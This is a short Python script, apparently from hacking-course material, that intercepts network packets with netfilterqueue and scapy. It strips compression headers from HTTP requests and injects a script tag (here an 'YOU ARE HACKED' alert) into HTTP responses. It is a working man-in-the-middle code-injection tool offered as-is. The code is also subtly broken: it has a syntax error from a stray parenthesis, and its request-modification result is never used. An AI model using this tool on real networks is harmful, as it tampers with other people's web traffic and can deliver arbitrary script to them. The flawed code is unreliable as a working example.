#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet,load):
    packet.load=load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load=scapy_packet[scapy.Raw].load)
        if scapy_packet[scapy.TCP].dport == 80:
                modified_load=re.sub("Accept-Encoding:.*?\\r\\n", "",load)
                print("[+] HTTP request")
        elif scapy_packet[scapy.TCP].sport == 80:
                print("[+]HTTP response")
                print(packet.show())
                load=scapy_packet[scapy.Raw].load.replace("</head>","<script>alert('YOU ARE HACKED');</script></head>")

        if load!=scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()  # forwarding to router access

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
